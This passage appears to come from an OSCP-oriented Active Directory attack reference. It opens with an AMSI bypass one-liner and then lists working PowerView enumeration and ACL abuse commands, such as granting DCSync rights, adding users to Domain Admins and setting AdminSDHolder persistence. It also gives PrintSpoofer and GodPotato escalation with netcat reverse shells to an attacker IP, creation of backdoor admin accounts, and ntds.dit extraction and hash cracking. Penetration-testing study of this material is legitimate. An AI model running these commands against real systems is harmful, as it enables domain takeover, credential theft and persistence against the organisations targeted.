[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# ---- ENUMERATION ----
Get-NetDomain                                    # domain info
Get-NetDomainController                          # DC info
Get-NetUser | select samaccountname,description  # all users + description
Get-NetUser -PreauthNotRequired | select samaccountname   # AS-REP targets
Get-NetUser -SPN | select samaccountname,serviceprincipalname  # Kerberoast targets
Get-NetGroup | select name                       # all groups
Get-NetGroupMember "Domain Admins" | select MemberName  # DA members
Get-NetComputer | select name,operatingsystem    # all machines
Get-NetSession -ComputerName DC01                # who is logged in
Find-LocalAdminAccess                            # WHERE ARE YOU LOCAL ADMIN
Find-InterestingDomainShareFile                  # interesting files in shares
Get-DomainSID                                    # domain SID

# ---- ACL ENUMERATION ----
Get-DomainObjectAcl -Identity svc_sql -ResolveGUIDs
Find-InterestingDomainAcl -ResolveGUIDs

# ---- ACL ABUSE ----

# GenericAll on user — password reset
Set-DomainUserPassword -Identity svc_sql \
  -AccountPassword (ConvertTo-SecureString 'Hacked123!' -AsPlainText -Force)

# GenericAll on user — set SPN for Kerberoast
Set-DomainObject -Identity svc_sql \
  -Set @{serviceprincipalname='fake/nothing.corp.local'}
# cleanup:
Set-DomainObject -Identity svc_sql -Clear serviceprincipalname

# GenericAll on group — add member
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'jdoe' -Verbose

# WriteDACL on domain — add DCSync rights
Add-DomainObjectAcl \
  -TargetIdentity "DC=corp,DC=local" \
  -PrincipalIdentity jdoe \
  -Rights DCSync -Verbose

# WriteOwner — take ownership
Set-DomainObjectOwner -Identity svc_sql -OwnerIdentity jdoe
Add-DomainObjectAcl -TargetIdentity svc_sql -PrincipalIdentity jdoe -Rights All

# AdminSDHolder persistence
Add-DomainObjectAcl \
  -TargetIdentity "CN=AdminSDHolder,CN=System,DC=corp,DC=local" \
  -PrincipalIdentity jdoe -Rights All
```

---

### Net commands (built-in Windows)
**What:** Basic Windows domain enumeration — no tools needed
**When:** PowerView not available
**Platform:** `[WINDOWS]`

```cmd
net user /domain                                 # all domain users
net user username /domain                        # specific user details
net group /domain                                # all groups
net group "Domain Admins" /domain                # DA members
net group "Enterprise Admins" /domain            # EA members
net accounts /domain                             # password policy
net localgroup administrators                    # local admins on this machine
net view                                         # domain machines
net view /domain:corp.local
```

---

## PRIVILEGE ESCALATION TOOLS

---

### PrintSpoofer
**What:** SeImpersonatePrivilege → SYSTEM via Print Spooler
**When:** SeImpersonatePrivilege enabled (very common on service accounts)
**Platform:** `[WINDOWS]`

```powershell
# Upload
*Evil-WinRM* PS> upload /opt/PrintSpoofer64.exe C:\Temp\PrintSpoofer.exe

# Check if you have the privilege first
whoami /priv | findstr "SeImpersonatePrivilege"

# Interactive SYSTEM shell
C:\Temp\PrintSpoofer.exe -i -c cmd
# Result: C:\Windows\system32> whoami → nt authority\system

# Execute command as SYSTEM
C:\Temp\PrintSpoofer.exe -c "net user hacker Password123! /add"
C:\Temp\PrintSpoofer.exe -c "net localgroup administrators hacker /add"

# Reverse shell
C:\Temp\PrintSpoofer.exe -c "C:\Temp\nc.exe KALI_IP 4444 -e cmd.exe"
```

---

### GodPotato
**What:** SeImpersonatePrivilege → SYSTEM — works on newer Windows
**When:** PrintSpoofer fails, Windows Server 2019/2022, Windows 10/11
**Platform:** `[WINDOWS]`

```powershell
# Upload
*Evil-WinRM* PS> upload /opt/GodPotato-NET4.exe C:\Temp\GodPotato.exe

# Execute command
C:\Temp\GodPotato.exe -cmd "cmd /c whoami"
C:\Temp\GodPotato.exe -cmd "cmd /c net user hacker Password123! /add"
C:\Temp\GodPotato.exe -cmd "cmd /c net localgroup administrators hacker /add"

# Reverse shell (start nc listener first)
C:\Temp\GodPotato.exe -cmd "cmd /c C:\Temp\nc.exe KALI_IP 4444 -e cmd.exe"
```

---

## PERSISTENCE TOOLS

---

### vssadmin (Shadow Copy)
**What:** Create Volume Shadow Copy to extract locked files (ntds.dit)
**When:** DA on DC — extract NTDS.dit for all domain hashes
**Platform:** `[WINDOWS]`

```cmd
# Create shadow copy
vssadmin create shadow /for=C:

# List shadow copies
vssadmin list shadows

# Copy ntds.dit from shadow (adjust number if needed)
copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit" C:\Temp\ntds.dit

# Copy SYSTEM hive (needed to decrypt ntds.dit)
copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM" C:\Temp\SYSTEM

# Copy SECURITY hive (optional)
copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY" C:\Temp\SECURITY

# Delete shadow copy after done (cleanup)
vssadmin delete shadows /shadow={SHADOW_ID} /quiet
```

```powershell
# Download to Kali
*Evil-WinRM* PS> download C:\Temp\ntds.dit /tmp/ntds.dit
*Evil-WinRM* PS> download C:\Temp\SYSTEM /tmp/SYSTEM
```

---

### ntdsutil (Built-in NTDS Backup)
**What:** Built-in Windows tool to create NTDS backup — cleaner than vssadmin
**When:** DA on DC — preferred method for ntds.dit extraction
**Platform:** `[WINDOWS]`

```cmd
# Create full backup (includes ntds.dit + SYSTEM)
ntdsutil "activate instance ntds" "ifm" "create full C:\Temp\ntdsbackup" quit quit

# Files created:
# C:\Temp\ntdsbackup\Active Directory\ntds.dit
# C:\Temp\ntdsbackup\registry\SYSTEM
```

```powershell
# Download to Kali
*Evil-WinRM* PS> download "C:\Temp\ntdsbackup\Active Directory\ntds.dit" /tmp/ntds.dit
*Evil-WinRM* PS> download "C:\Temp\ntdsbackup\registry\SYSTEM" /tmp/SYSTEM
```

```bash
# Parse on Kali [KALI]
impacket-secretsdump -ntds /tmp/ntds.dit -system /tmp/SYSTEM LOCAL
impacket-secretsdump -ntds /tmp/ntds.dit -system /tmp/SYSTEM LOCAL > /tmp/all_hashes.txt

# Bulk crack
hashcat --username -m 1000 /tmp/all_hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## INSTALL ALL TOOLS — Kali Setup

```bash
# Package manager
sudo apt update && sudo apt install -y \
  nmap smbclient samba-common-bin ldap-utils enum4linux-ng \
  nbtscan arp-scan john hashcat

# Python tools
pip install impacket netexec bloodhound ldapdomaindump

# Ruby
sudo gem install evil-winrm

# Kerbrute
wget https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64 \
  -O /usr/local/bin/kerbrute && chmod +x /usr/local/bin/kerbrute

# Windows tools (for upload to targets)
mkdir -p /opt/windows-tools

# PowerView
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 \
  -O /opt/windows-tools/PowerView.ps1

# PrintSpoofer
wget https://github.com/itm4n/PrintSpoofer/releases/latest/download/PrintSpoofer64.exe \
  -O /opt/windows-tools/PrintSpoofer64.exe

# GodPotato
wget https://github.com/BeichenDream/GodPotato/releases/latest/download/GodPotato-NET4.exe \
  -O /opt/windows-tools/GodPotato.exe

# Mimikatz
wget https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip \
  -O /tmp/mimi.zip && unzip /tmp/mimi.zip -d /opt/windows-tools/mimikatz/

# Verify all impacket tools present
which impacket-GetNPUsers impacket-GetUserSPNs impacket-secretsdump \
  impacket-psexec impacket-wmiexec impacket-smbexec impacket-atexec \
  impacket-dcomexec impacket-ticketer impacket-getTGT
```

---

*AD Tools Complete Reference — All payloads, all use cases*
*Part of OSCP AD Series: 1A → 1B → 2A → 2B → 3A → 3B → 3C*
